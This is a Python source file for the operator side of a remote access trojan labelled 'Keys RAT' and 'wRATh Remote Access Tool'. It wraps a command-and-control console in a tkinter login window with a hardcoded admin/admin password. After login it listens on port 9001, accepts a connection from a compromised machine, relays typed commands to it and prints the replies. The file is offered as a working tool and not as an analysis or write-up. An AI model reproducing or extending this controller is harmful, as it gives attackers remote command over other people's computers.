from tkinter import *
from tkinter import messagebox
import os
import subprocess
import socket
from setuptools import Command

host=socket.gethostname()
port='Insert Port Here'

root=Tk()
root.title('Keys RAT by 0xP')
root.geometry('925x500+300+200')
root.configure(bg="#fff")
root.resizable(False,False)

def signin():
    username=user.get()
    password=code.get()
    
    if username=='admin' and password=='admin':
        print('Welcome to wRATh Remote Access Tool')
        print(" Server is currently running @ ", host)
        print(" Waiting for any incoming connections...")
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.bind(('0.0.0.0',9001))
        c.listen()
        s,a = c.accept()
        print("")
        print(" You have connected to the server successfully ")
        
        #connection has been completed
        
        #command handling
        
        while True:
            # Receive data
            data = s.recv(1024)
            # Check for end of command
            if data.decode().endswith("EOFX") == True:
                # Print data without 'EOFX'
                print(data[:-4].decode())
                # Get next command
                nextcmd = input("please type a command: ")
                # Send that $hit
                if nextcmd == 'quit':
                    s.send(nextcmd.encode())
                    break
                else: s.send(nextcmd.encode())
            # If we haven't reach end of command, print
            else:
                print(data.decode('ascii'))
        
    elif username!='admin' or password!='admin':
            messagebox.showerror("Invalid","invalid username and password")

img = PhotoImage(file='index1.png')
Label(root,image=img,bg='white').place(x=50,y=50)

frame=Frame(root,width=350,height=350,bg="white")
frame.place(x=480,y=70)

heading=Label(frame,text='Command and Control',fg='#57a1f8',bg='white',font=('Microsoft YaHei UI Light',15,'bold'))
heading.place(x=60,y=5)

##########----------------------------------------------------

def on_enter(e):
    user.delete(0, 'end')
    
def on_leave(e):
    name=user.get()
    if name=='':
        user.insert(0,'Username')
user = Entry(frame,width=25,fg='black',border=0,bg="white",font=('Microsoft YaHei UI Light',11))
user.place(x=30,y=80)
user.insert(0,'Username')
user.bind('<FocusIn>', on_enter)
user.bind('<FocusOut>', on_leave)

Frame(frame,width=295,height=2,bg='black').place(x=25,y=107)

##########----------------------------------------------------
def on_enter(e):
    code.delete(0, 'end')
    
def on_leave(e):
    name=code.get()
    if name=='':
        code.insert(0,'Password')
        
        
code = Entry(frame,width=25,fg='black',border=0,bg="white",font=('Microsoft YaHei UI Light',11))
code.place(x=30,y=150)
code.insert(0,'Password')
code.bind('<FocusIn>', on_enter)
code.bind('<FocusOut>', on_leave)

Frame(frame,width=295,height=2,bg='black').place(x=25,y=177)

##########----------------------------------------------------

Button(frame,width=39,pady=7,text='Authenticate',bg='#57a1f8',fg='white',border=0,command=signin).place(x=35,y=204)

root.mainloop()
